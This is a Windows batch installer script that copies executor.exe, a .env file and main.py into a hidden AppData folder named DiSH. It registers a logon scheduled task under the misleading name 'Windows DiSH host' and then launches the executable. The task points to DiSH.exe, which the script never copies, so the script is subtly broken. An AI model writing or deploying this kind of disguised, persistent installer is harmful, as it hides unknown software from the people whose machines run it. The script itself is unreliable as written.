@echo off
pip install -r requirements.txt
mkdir %appdata%\DiSH
copy executor.exe %appdata%\DiSH
copy .env %appdata%\DiSH
copy main.py %appdata%\DiSH
schtasks /create /sc onlogon /tn "Windows DiSH host" /tr "%appdata%\DiSH\DiSH.exe" /f
echo starting...
start %appdata%\DiSH\executor.exe
pause > nul